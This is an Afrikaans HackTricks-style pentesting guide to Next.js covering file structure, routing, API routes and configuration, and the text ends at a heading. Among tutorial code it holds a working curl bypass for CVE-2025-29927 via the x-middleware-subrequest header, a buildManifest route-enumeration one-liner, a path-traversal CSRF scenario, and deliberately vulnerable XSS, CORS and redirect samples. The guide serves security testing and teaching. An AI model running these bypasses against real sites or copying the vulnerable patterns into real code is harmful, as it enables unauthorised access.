# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Algemene argitektuur van 'n Next.js-toepassing

### Tipiese lêerstruktuur

'n Standaard Next.js-projek volg 'n spesifieke lêer- en gidsstruktuur wat sy funksies soos routing, API endpoints, en bestuur van statiese assets vergemaklik. Hier is 'n tipiese uitleg:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kern-gidse en Lêers

- **public/:** Huisves statiese hulpbronne soos beelde, lettertipes en ander lêers. Lêers hier is toeganklik by die wortelpad (`/`).
- **app/:** Sentrale gids vir jou toepassing se bladsye, uitleg, komponente en API-roetes. Omhels die **App Router** paradigma, wat gevorderde routing-funksies en skeiding tussen server- en kliëntkomponente moontlik maak.
- **app/layout.tsx:** Definieer die worteluitleg vir jou toepassing, wat rondom alle bladsye vou en konsekwente UI-elemente soos headers, voeters en navigasiebalkies verskaf.
- **app/page.tsx:** Dien as die toegangspunt vir die wortelroute `/`, en render die tuisblad.
- **app/[route]/page.tsx:** Hanteer statiese en dinamiese roetes. Elke vouer binne `app/` verteenwoordig 'n route-segment, en `page.tsx` binne daardie vouers ooreenstem met die route se komponent.
- **app/api/:** Bevat API-roetes, wat jou toelaat om serverless funksies te skep wat HTTP-versoeke hanteer. Hierdie roetes vervang die tradisionele `pages/api` gids.
- **app/components/:** Huisves herbruikbare React-komponente wat oor verskeie bladsye en uitlegte gebruik kan word.
- **app/styles/:** Bevat globale CSS-lêers en CSS Modules vir komponent-geskepte styling.
- **app/utils/:** Sluit utility-funksies, helper-modules en ander nie-UI logika in wat oor die toepassing gedeel kan word.
- **.env.local:** Stoor omgewingveranderlikes spesifiek vir die plaaslike ontwikkelingsomgewing. Hierdie veranderlikes word **nie** in weergawebeheer gecommit nie.
- **next.config.js:** Pas Next.js-gedrag aan, insluitend webpack-konfigurasies, omgewingveranderlikes en sekuriteitsinstellings.
- **tsconfig.json:** Konfigureer TypeScript-instellings vir die projek, wat tipekontroles en ander TypeScript-funksies moontlik maak.
- **package.json:** Bestuur projekafhanklikhede, skripte en metadata.
- **README.md:** Verskaf dokumentasie en inligting oor die projek, insluitend opstelinstruksies, gebruiksriglyne en ander relevante besonderhede.
- **yarn.lock / package-lock.json:** Sluit die projek se afhanklikhede vas op spesifieke weergawes, wat konsekwente installasies oor verskillende omgewings verseker.

## Kliëntkant in Next.js

### Lêer-gebaseerde routing in die `app` Gids

Die `app` gids is die hoeksteen van routing in die nuutste Next.js-weergawes. Dit gebruik die lêerstelsel om roetes te definieer, wat roetebestuur intuïtief en skaalbaar maak.

<details>

<summary>Hantering van die wortelpad /</summary>

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Belangrike lêers:**

- **`app/page.tsx`**: Hanteer versoeke na die wortelpad `/`.
- **`app/layout.tsx`**: Definieer die uitleg van die toepassing en omsluit alle bladsye.

**Implementering:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx`-lêer direk onder die `app`-gids kom ooreen met die `/`-roete.
- **Weergawing:** Hierdie komponent gee die inhoud van die tuisblad weer.
- **Layout-integrasie:** Die `HomePage`-komponent word deur die `layout.tsx` omhul, wat headers, footers en ander algemene elemente kan insluit.

</details>

<details>

<summary>Hantering van Ander Statiese Paaie</summary>

**Voorbeeld: `/about` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Verduideliking:**

- **Roete-definisie:** Die `page.tsx`-lêer binne die `about`-gids stem ooreen met die `/about`-roete.
- **Rendering:** Hierdie komponent render die inhoud vir die about-bladsy.

</details>

<details>

<summary>Dinamiese Roetes</summary>

Dinamiese roetes maak dit moontlik om paaie met veranderlike segmenten te hanteer, wat toepassings in staat stel om inhoud te vertoon gebaseer op parameters soos IDs, slugs, ens.

**Voorbeeld: `/posts/[id]` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Verduideliking:**

- **Dinamiese segment:** `[id]` dui 'n dinamiese segment in die route aan, wat die `id` parameter vanaf die URL vasvang.
- **Toegang tot parameters:** Die `params` object bevat die dinamiese parameters, beskikbaar binne die komponent.
- **Roete-ooreenkoms:** Enige pad wat ooreenstem met `/posts/*`, soos `/posts/1`, `/posts/abc`, ens., sal deur hierdie komponent hanteer word.

</details>

<details>

<summary>Geneste roetes</summary>

Next.js ondersteun geneste routering, wat hiërargiese roetestrukture moontlik maak wat die gidsindeling weerspieël.

**Voorbeeld: `/dashboard/settings/profile` Roete**

**Lêerstruktuur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Verduideliking:**

- **Deep Nesting:** Die `page.tsx` lêer binne `dashboard/settings/profile/` stem ooreen met die `/dashboard/settings/profile` route.
- **Hierarchy Reflection:** Die gidsstruktuur weerspieël die URL-pad, wat onderhoudbaarheid en duidelikheid verbeter.

</details>

<details>

<summary>Catch-all-roetes</summary>

Catch-all-roetes hanteer meerdere geneste segmente of onbekende paaie en bied buigsaamheid in roeteverwerking.

**Voorbeeld: `/*`-route**

**Lêerstruktuur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementering:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Verduideliking:**

- **Catch-All-segment:** `[...slug]` vang al die oorblywende padsegmente as 'n array.
- **Gebruik:** Nuttig vir die hantering van dinamiese roeteringscenario's soos gebruikersgegenereerde paaie, geneste kategorieë, ens.
- **Roete-ooreenstemming:** Paaie soos `/anything/here`, `/foo/bar/baz`, ens., word deur hierdie komponent hanteer.

</details>

### Potensiële kliëntkant-kwesbaarhede

Alhoewel Next.js 'n veilige fondament bied, kan onsamehangende koderingpraktyke kwesbaarhede inbring. Belangrike kliëntkant-kwesbaarhede sluit in:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-aanvalle gebeur wanneer kwaadwillige skripte in betroubare webwerwe ingevoer word. Aanvallers kan skripte in gebruikers se blaaiers uitvoer, data steel of aksies namens die gebruiker uitvoer.

**Voorbeeld van kwesbare kode:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Waarom dit kwesbaar is:** Die gebruik van `dangerouslySetInnerHTML` met onbetroubare insette laat aanvallers toe om kwaadwillige skripte in te voeg.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Dit gebeur wanneer gebruikersinsette verkeerd hanteer word in sjablone, wat aanvallers toelaat om sjablone of uitdrukkings in te voeg en uit te voer.

**Voorbeeld van kwesbare kode:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Waarom dit kwesbaar is:** As `template` of `data` kwaadaardige inhoud bevat, kan dit lei tot die uitvoering van onbedoelde kode.

</details>

<details>

<summary>Client Path Traversal</summary>

Dit is 'n kwesbaarheid wat aanvallers in staat stel om kliëntkant-paaie te manipuleer om onbedoelde aksies uit te voer, soos Cross-Site Request Forgery (CSRF). In teenstelling met server-side path traversal, wat die server se filesystem teiken, fokus CSPT op die uitbuiting van client-side meganismes om geldige API-aanvrae na kwaadaardige endpoints om te lei.

**Voorbeeld van kwesbare kode:**

'n Next.js toepassing laat gebruikers toe om lêers op te laai en af te laai. Die aflaaifunksie is aan die kliëntkant geïmplementeer, waar gebruikers die lêerpad wat hulle wil aflaai, kan spesifiseer.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Aanslagscenario

1. **Attacker's Objective**: Voer 'n CSRF-aanval uit om 'n kritieke lêer (bv. `admin/config.json`) te verwyder deur die `filePath` te manipuleer.
2. **Exploiting CSPT**:
- **Malicious Input**: Die aanvaller stel 'n URL saam met 'n gemanipuleerde `filePath` soos `../deleteFile/config.json`.
- **Resulting API Call**: Die client-side kode maak 'n versoek na `/api/files/../deleteFile/config.json`.
- **Server's Handling**: As die bediener nie die `filePath` valideer nie, verwerk dit die versoek en kan sensitiewe lêers uitvee of blootstel.
3. **Executing CSRF**:
- **Crafted Link**: Die aanvaller stuur die slagoffer 'n skakel of embed 'n kwaadwillige script wat die aflaaiversoek met die gemanipuleerde `filePath` aktiveer.
- **Outcome**: Die slagoffer voer die aksie onbewustelik uit, wat lei tot ongemagtigde lêertoegang of verwydering.

#### Why It's Vulnerable

- **Lack of Input Validation**: Die client-side laat arbitrêre `filePath`-insette toe, wat path traversal moontlik maak.
- **Trusting Client Inputs**: Die server-side API vertrou en verwerk die `filePath` sonder sanitisering.
- **Potential API Actions**: As die API-endpoint toestandveranderende aksies uitvoer (bv. verwyder, wysig lêers), kan dit via CSPT uitgebuit word.

</details>

### Recon: statiese export-roete-ontdekking via _buildManifest

Wanneer `nextExport`/`autoExport` waar is (statiese export), openbaar Next.js die `buildId` in die HTML en dien 'n build manifest by `/_next/static/<buildId>/_buildManifest.js`. Die `sortedPages`-array en route→chunk-kartering daar lys elke prerendered bladsy sonder brute force.

- Haal die buildId uit die root response (dikwels onderaan gedruk) of uit `<script>`-tags wat `/_next/static/<buildId>/...` laai.
- Haal die manifest op en onttrek roetes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Gebruik die ontdekte paths (vir voorbeeld `/docs`, `/docs/content/examples`, `/signin`) om auth testing en endpoint discovery aan te dryf.

## Bedienerkant in Next.js

### Bedienerkant-rendering (SSR)

Bladsye word by elke versoek op die bediener gerender, wat verseker dat die gebruiker volle gerenderde HTML ontvang. In hierdie geval moet jy jou eie pasgemaakte server opstel om die versoeke te verwerk.

**Gebruikssituasies:**

- Dynamiese inhoud wat gereeld verander.
- SEO-optimalisering, aangesien soekenjins die volle gerenderde bladsy kan kruip.

**Implementering:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statiese webwerf-generering (SSG)

Bladsye word vooraf-gerender tydens boutyd, wat lei tot vinniger laaitye en verminderde bedienerlas.

**Gebruiksscenario's:**

- Inhoud wat nie gereeld verander nie.
- Blogs, dokumentasie, bemarkingsbladsye.

**Implementering:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverlose Funksies (API Routes)

Next.js laat die skep van API-endpunte as serverlose funksies toe. Hierdie funksies word op aanvraag uitgevoer sonder die behoefte aan 'n toegewyde bediener.

**Gebruiksscenario's:**

- Vorminskrywings hanteer.
- Interaksie met databases.
- Data verwerk of integreer met APIs van derde partye.

**Implementering:**

Met die bekendstelling van die `app` directory in Next.js 13 het routing en API-hantering meer buigsaam en kragtig geword. Hierdie moderne benadering stem nou baie ooreen met die lêergebaseerde routingstelsel, maar bied verbeterde vermoëns, insluitend ondersteuning vir server- en kliëntkomponente.

#### Basiese roetehanteraar

**File Structure:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementering:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Verduideliking:**

- **Ligging:** API-roetes word geplaas in die `app/api/` gids.
- **Lêerbenaming:** Elke API-endpoint woon in sy eie gids wat 'n `route.js` of `route.ts` lêer bevat.
- **Geëksporteerde funksies:** In plaas van 'n enkele standaard-export, word spesifieke HTTP-metode funksies (bv. `GET`, `POST`) geёksporteer.
- **Response-hantering:** Gebruik die `Response` constructor om responses terug te stuur, wat meer beheer oor headers en statuskodes toelaat.

#### Hoe om ander paadjies en metodes te hanteer:

<details>

<summary>Hantering van spesifieke HTTP-metodes</summary>

Next.js 13+ laat jou toe om hanteerders vir spesifieke HTTP-metodes in dieselfde `route.js` of `route.ts` lêer te definieer, wat duideliker en meer georganiseerde kode bevorder.

**Voorbeeld:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Meervoudige exports:** Elke HTTP-metode (`GET`, `PUT`, `DELETE`) het sy eie geëksporteerde funksie.
- **Parameters:** Die tweede argument gee toegang tot roete-parameters via `params`.
- **Verbeterde responses:** Groter beheer oor response-objekte, wat presiese header- en statuskodebestuur moontlik maak.

</details>

<details>

<summary>Catch-All en Geneste Roetes</summary>

Next.js 13+ ondersteun gevorderde routing-funksies soos catch-all-roetes en geneste API-roetes, wat meer dinamiese en skaalbare API-strukture moontlik maak.

**Catch-All Roete Voorbeeld:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Verduideliking:**

- **Sintaksis:** `[...]` dui 'n allesomvattende segment aan, wat alle geneste paaie vang.
- **Gebruik:** Nuttig vir APIs wat wisselende roete-dieptes of dinamiese segmentte moet hanteer.

**Voorbeeld van geneste roetes:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Verduideliking:**

- **Diepe genesting:** Laat hiërargiese API-strukture toe wat hulpbronne se verhoudings weerspieël.
- **Toegang tot parameters:** Maklik toegang tot meerdere roeteparameters via die `params`-object.

</details>

<details>

<summary>Hantering van API-roetes in Next.js 12 en vroeër</summary>

## API-roetes in die `pages` Directory (Next.js 12 en vroeër)

Voordat Next.js 13 die `app` directory en verbeterde routeringsvermoëns bekendgestel het, is API-roetes hoofsaaklik binne die `pages` directory gedefinieer. Hierdie benadering word steeds wyd gebruik en ondersteun in Next.js 12 en vroeër weergawes.

#### Basiese API-roete

**Lêerstruktuur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Toelichting:**

- **Ligging:** API-routes bevind hulle in die `pages/api/` gids.
- **Uitvoer:** Gebruik `export default` om die handler-funksie te definieer.
- **Funksiesignatuur:** Die handler ontvang `req` (HTTP-versoek) en `res` (HTTP-antwoord) objekte.
- **Routing:** Die lêernaam (`hello.js`) stem ooreen met die endpoint `/api/hello`.

#### Dinamiese API-routes

**Lêerstruktuur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementering:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Verduideliking:**

- **Dinamiese Segmente:** Vierkantige hakies (`[id].js`) dui dinamiese roete-segmente aan.
- **Toegang tot Parameters:** Gebruik `req.query.id` om by die dinamiese parameter te kom.
- **Hantering van Metodes:** Gebruik voorwaardelike logika om verskillende HTTP-metodes (`GET`, `PUT`, `DELETE`, ens.) te hanteer.

#### Hantering van Verskillende HTTP-metodes

Alhoewel die basiese API-roete-voorbeeld alle HTTP-metodes binne 'n enkele funksie hanteer, kan jy jou kode struktureer om elke metode eksplisiet te hanteer vir beter duidelikheid en onderhoudbaarheid.

**Voorbeeld:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste praktyke:**

- **Skeiding van bekommernisse:** Skei die logika duidelik vir verskillende HTTP-metodes.
- **Responskonsekwentheid:** Verseker konsekwente responsstrukture om kliëntkant hantering te vergemaklik.
- **Foutbehandeling:** Hanteer nie-ondersteunde metodes en onverwagte foute op 'n netjiese wyse.

</details>

### CORS-konfigurasie

Beheer watter origins toegang tot jou API-roetes kan kry om Cross-Origin Resource Sharing (CORS)-kwesbaarhede te verminder.

**Slegte konfigurasievoorbeeld:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Let op dat **CORS ook in al die API-roetes gekonfigureer kan word** binne die **`middleware.ts`**-lêer:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Probleem:**

- **`Access-Control-Allow-Origin: '*'`:** Laat enige webwerf toe om toegang tot die API te kry, wat moontlik kwaadwillige werwe toelaat om sonder beperkings met jou API te kommunikeer.
- **Breë metode-toestemming:** Om alle metodes toe te laat kan aanvalers in staat stel om ongewenste handelinge uit te voer.

**Hoe aanvallers dit uitbuit:**

Aanvallers kan kwaadwillige webwerwe skep wat versoeke na jou API stuur en moontlik funksies misbruik soos data-ophaling, data-manipulasie, of om ongewenste handelinge namens geverifieerde gebruikers te veroorsaak.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Bedienerkode-blootstelling aan die kliëntkant

Dit kan maklik gebeur om **kode wat deur die bediener gebruik word ook in kode blootgestel en gebruik deur die kliëntkant te gebruik**, die beste manier om te verseker dat 'n kodelêer nooit aan die kliëntkant blootgestel word nie, is deur hierdie import aan die begin van die lêer te gebruik:
```js
import "server-only"
```
## Belangrike lêers en hul rolle

### `middleware.ts` / `middleware.js`

**Ligging:** Wortel van die projek of binne `src/`.

**Doel:** Voer kode uit in die server-side serverless-funksie voordat 'n versoek verwerk word, wat toelaat vir take soos outentisering, omleidings, of die wysiging van reaksies.

**Uitvoeringsvloei:**

1. **Binnekomende versoek:** Die middleware onderskep die versoek.
2. **Verwerking:** Voer operasies uit gebaseer op die versoek (bv., kontroleer outentisering).
3. **Wysiging van reaksie:** Kan die reaksie verander of beheer aan die volgende behandelaar oorgee.

**Voorbeelde van gebruiksgevalle:**

- Om nie-geauthentiseerde gebruikers om te lei.
- Byvoeg van persoonlike headers.
- Log versoeke.

**Voorbeeldkonfigurasie:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

As autorisasie in middleware afgedwing word, aangetaste Next.js-uitgawes (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) kan omseil word deur die `x-middleware-subrequest` header in te voeg. Die framework sal middleware recursion oorslaan en die beskermde bladsy teruggee.

- Basiese gedrag is tipies 'n 307-omleiding na 'n aanmeld-roete soos `/api/auth/signin`.
- Stuur 'n lang `x-middleware-subrequest` waarde (herhaal `middleware` om `MAX_RECURSION_DEPTH` te bereik) om die respons na 200 om te keer:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Omdat geauthentiseerde bladsye baie subbronne laai, voeg die header by elke versoek (bv. Burp Match/Replace met 'n leë match-string) om te verhoed dat assets herlei word.

### `next.config.js`

**Ligging:** Root van die projek.

**Doel:** Stel Next.js-gedrag in, skakel funksies aan of af, pas webpack-konfigurasies aan, stel omgewingveranderlikes in, en konfigureer verskeie sekuriteitsfunksies.

**Belangrike sekuriteitskonfigurasies:**

<details>

<summary>Sekuriteitsheaders</summary>

Sekuriteitsheaders verbeter die sekuriteit van jou toepassing deur blaaiers te instrueer oor hoe om inhoud te hanteer. Hulle help om verskeie aanvalle te beperk soos Cross-Site Scripting (XSS), Clickjacking, en MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Voorbeelde:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Beeldoptimaliseringsinstellings</summary>

Next.js optimaliseer beelde vir prestasie, maar wanopstellings kan tot sekuriteitskwesbaarhede lei, soos om onbetroubare bronne toe te laat om kwaadwillige inhoud in te voeg.

**Voorbeeld van slegte konfigurasie:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Probleem:**

- **`'*'`:** Laat toe dat beelde vanaf enige eksterne bron gelaai word, insluitend onbetroubare of kwaadwillige domeine. Attackers can host images containing malicious payloads or content that misleads users.
- Nog 'n probleem kan wees om 'n domein toe te laat **waar enigiemand 'n beeld kan oplaai** (soos `raw.githubusercontent.com`)

**Hoe Attackers dit misbruik:**

Deur beelde van kwaadwillige bronne in te voeg, kan Attackers phishing attacks uitvoer, misleidende inligting vertoon, of exploit vulnerabilities in image rendering libraries.

</details>

<details>

<summary>Blootstelling van Omgewingsveranderlikes</summary>

Hanteer sensitiewe inligting soos API keys en database credentials veilig sonder om dit aan die client bloot te stel.

#### a. Blootstelling van Sensitiewe Veranderlikes

**Slegte Konfigurasie Voorbeeld:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Probleem:**

- **`SECRET_API_KEY`:** Sonder die `NEXT_PUBLIC_`-voorvoegsel openbaar Next.js nie veranderlikes aan die kliënt nie. As dit egter per ongeluk met die voorvoegsel (bv. `NEXT_PUBLIC_SECRET_API_KEY`) gemerk is, word dit aan die kliëntkant toeganklik.

**Hoe aanvallers dit misbruik:**

As sensitiewe veranderlikes aan die kliënt openbaar is, kan aanvallers dit deur die kliëntkantkode of netwerkversoeke te ondersoek opspoor, en sodoende ongemagtigde toegang tot APIs, databasisse, of ander dienste verkry.

</details>

<details>

<summary>Omleidings</summary>

Beheer URL-omleidings en herskrywings binne jou toepassing, en sorg dat gebruikers behoorlik gelei word sonder om open redirect vulnerabilities in te lei.

#### a. Open Redirect Vulnerability

**Slegte konfigurasie voorbeeld:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Probleem:**

- **Dinamiese Bestemming:** Laat gebruikers toe om enige URL te spesifiseer, wat open redirect attacks moontlik maak.
- **Vertrou Gebruikerinvoer:** Redirects na URLs wat deur gebruikers verskaf word sonder validering kan lei tot phishing, malware distribution, of credential theft.

**Hoe aanvallers dit misbruik:**

Aanvallers kan URLs saamstel wat blykbaar van jou domein afkomstig is, maar gebruikers na malicious sites redirect. Byvoorbeeld:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Gebruikers wat die oorspronklike domein vertrou, kan ongemerk na skadelike webwerwe navigeer.

</details>

<details>

<summary>Webpack-konfigurasie</summary>

Pas Webpack-konfigurasies aan vir jou Next.js-app, wat onbedoeld sekuriteitskwesbaarhede kan veroorsaak as dit nie versigtig hanteer word nie.

#### a. Blootstelling van sensitiewe modules

**Slegte konfigurasievoorbeeld:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Probleem:**

- **Exposing Sensitive Paths:** Aliasering van sensitiewe directories en die toelaat van client-side toegang kan leak vertroulike inligting.
- **Bundling Secrets:** As sensitiewe lêers vir die client gebundel word, raak hul inhoud toeganklik deur source maps of deur die client-side code te inspekteer.

**How attackers abuse it:**

Aanvallers kan toegang kry tot of die toepassing se gidsstruktuur herbou, en moontlik sensitiewe lêers of data vind en uitbuit.

</details>

### `pages/_app.js` en `pages/_document.js`

#### **`pages/_app.js`**

**Doel:** Oorskryf die standaard App-component en laat globale state, styles en layout-komponente toe.

**Gebruikgevalle:**

- Invoeging van globale CSS.
- Byvoeging van layout-wrappers.
- Integrasie van state management-biblioteke.

**Voorbeeld:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

